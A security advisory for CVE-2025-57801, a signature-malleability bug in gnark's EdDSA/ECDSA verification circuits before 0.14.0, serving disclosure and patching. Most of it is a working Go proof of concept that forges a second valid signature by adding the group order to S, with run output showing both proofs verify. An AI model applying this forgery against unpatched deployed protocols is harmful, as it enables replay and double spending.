# gnark is vulnerable to signature malleability in EdDSA and ECDSA due to missing scalar checks

**GHSA**: GHSA-95v9-hv42-pwrj | **CVE**: CVE-2025-57801 | **Severity**: high (CVSS 9.1)

**CWE**: CWE-347

**Affected Packages**:
- **github.com/consensys/gnark** (go): < 0.14.0

## Description

In version before, `sig.s` used without asserting `0 ≤ S < order` in `Verify function` in [eddsa.go](https://github.com/Consensys/gnark/blob/d9a42397979b05f95f21a601fd219b06a8d60b7b/std/signature/eddsa/eddsa.go) and [ecdsa.go](https://github.com/Consensys/gnark/blob/d9a42397979b05f95f21a601fd219b06a8d60b7b/std/signature/ecdsa/ecdsa.go), which will lead to *signature malleability* vulnerability. 



### Impact

Since gnark’s native EdDSA and ECDSA circuits lack essential constraints, multiple distinct witnesses can satisfy the same public inputs. In protocols where nullifiers or anti-replay checks are derived from `(R, S)`, this enables signature malleability and may lead to double spending.



### Exploitation

```go
package main

import (
	"crypto/rand"
	"fmt"
	"math/big"

	"github.com/consensys/gnark-crypto/ecc"
	mimcHash "github.com/consensys/gnark-crypto/ecc/bn254/fr/mimc"
	eddsaCrypto "github.com/consensys/gnark-crypto/ecc/bn254/twistededwards/eddsa"

	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
	"github.com/consensys/gnark/std/algebra/native/twistededwards"
	stdMimc "github.com/consensys/gnark/std/hash/mimc"
	stdEddsa "github.com/consensys/gnark/std/signature/eddsa"

	te "github.com/consensys/gnark-crypto/ecc/twistededwards"
)

// Circuit
type eddsaCircuit struct {
	Msg frontend.Variable  `gnark:",public"`
	Pk  stdEddsa.PublicKey `gnark:",public"`
	Sig stdEddsa.Signature
}

func (c *eddsaCircuit) Define(api frontend.API) error {
	curve, _ := twistededwards.NewEdCurve(api, te.BN254)
	hasher, _ := stdMimc.NewMiMC(api)
	stdEddsa.Verify(curve, c.Sig, c.Msg, c.Pk, &hasher)
	return nil
}

func groupOrder() *big.Int {
	// BN254 scalar field order (r)
	const rStr = "21888242871839275222246405745257275088548364400416034343698204186575808495617"
	n, _ := new(big.Int).SetString(rStr, 10)
	return n
}

// Forge signature: S → S + order
func forge(sig eddsaCrypto.Signature) eddsaCrypto.Signature {
	order := groupOrder()

	var forged eddsaCrypto.Signature
	forged.R = sig.R

	s := new(big.Int).SetBytes(sig.S[:])
	s.Add(s, order)

	buf := make([]byte, 32)
	copy(buf[32-len(s.Bytes()):], s.Bytes())
	copy(forged.S[:], buf)
	return forged
}

func main() {
	// Generate key pair
	priv, _ := eddsaCrypto.GenerateKey(rand.Reader)
	pub := priv.PublicKey
	msg := []byte("multi-witness")

	// Create honest signature
	h := mimcHash.NewMiMC()
	h.Write(msg)
	rawSig, _ := priv.Sign(msg, h)

	var honest eddsaCrypto.Signature
	honest.SetBytes(rawSig)
	forged := forge(honest) // S + order

	// Setup: Compile circuit and do trusted setup
	circuit := &eddsaCircuit{}
	ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, circuit)
	if err != nil {
		fmt.Printf("Circuit compilation failed: %v\n", err)
		return
	}

	pk, vk, err := groth16.Setup(ccs)
	if err != nil {
		fmt.Printf("Trusted setup failed: %v\n", err)
		return
	}

	// Public inputs (same for both witnesses)
	var public eddsaCircuit
	public.Msg = new(big.Int).SetBytes(msg)
	public.Pk.Assign(te.BN254, pub.Bytes())

	// witness 1: honest signature
	w1 := public
	w1.Sig.Assign(te.BN254, honest.Bytes())

	witness1, err := frontend.NewWitness(&w1, ecc.BN254.ScalarField())
	if err != nil {
		fmt.Printf("Failed to create witness1: %v\n", err)
		return
	}

	proof1, err := groth16.Prove(ccs, pk, witness1)
	if err != nil {
		fmt.Println("Witness 1 (honest): Prover failed!")
	} else {
		publicWitness1, err := witness1.Public()
		if err != nil {
			fmt.Println("Witness 1 (honest): Prover failed!")
		} else {
			err = groth16.Verify(proof1, vk, publicWitness1)
			if err != nil {
				fmt.Println("Witness 1 (honest): Prover failed!")
			} else {
				fmt.Println("Witness 1 (honest): Prover succeeded!")
			}
		}
	}

	// witness 2: forged signature
	w2 := public
	w2.Sig.Assign(te.BN254, forged.Bytes())
	fmt.Println(honest.R.Equal(&forged.R))
	fmt.Println(honest.S != forged.S)

	witness2, err := frontend.NewWitness(&w2, ecc.BN254.ScalarField())
	if err != nil {
		fmt.Printf("Failed to create witness2: %v\n", err)
		return
	}

	proof2, err := groth16.Prove(ccs, pk, witness2)
	if err != nil {
		fmt.Println("Witness 2 (forged): Prover failed!")
	} else {
		publicWitness2, err := witness2.Public()
		if err != nil {
			fmt.Println("Witness 2 (forged): Prover failed!")
		} else {
			err = groth16.Verify(proof2, vk, publicWitness2)
			if err != nil {
				fmt.Println("Witness 2 (forged): Prover failed!")
			} else {
				fmt.Println("Witness 2 (forged): Prover succeeded!")
			}
		}
	}
}
```

### Result

```bash
go run multiple_witnesses.go

13:47:33 INF compiling circuit
13:47:33 INF parsed circuit inputs nbPublic=3 nbSecret=3
13:47:33 INF building constraint builder nbConstraints=7003
13:47:33 DBG constraint system solver done nbConstraints=7003 took=2.696334
13:47:33 DBG prover done acceleration=none backend=groth16 curve=bn254 nbConstraints=7003 took=44.164208
13:47:33 DBG verifier done backend=groth16 curve=bn254 took=0.983583
Witness 1 (honest): Prover succeeded!
true
true
13:47:33 DBG constraint system solver done nbConstraints=7003 took=2.59125
13:47:33 DBG prover done acceleration=none backend=groth16 curve=bn254 nbConstraints=7003 took=47.168709
13:47:33 DBG verifier done backend=groth16 curve=bn254 took=0.995833
Witness 2 (forged): Prover succeeded!
```



### Credits

XlabAI Team of Tencent Xuanwu Lab

Atuin Automated Vulnerability Discovery Engine 

SJTU Group of Software Security In Progress

Prof. Yu Yu's Lab at SJTU

### Additional mitigation

The initial patch added check for `s <= curve order`, omitting the case `s == curve order`. Even though the case is unlikely to be exploitable (requires finding a preimage for `H(R || A || M)`), then it is additionally fixed in https://github.com/Consensys/gnark/pull/1684 (commit https://github.com/Consensys/gnark/commit/69638c5f14b77ae0ebee23e1d8f64f3bb4e22fd5 on master). Thanks for additional reporting by https://github.com/kexinoh.
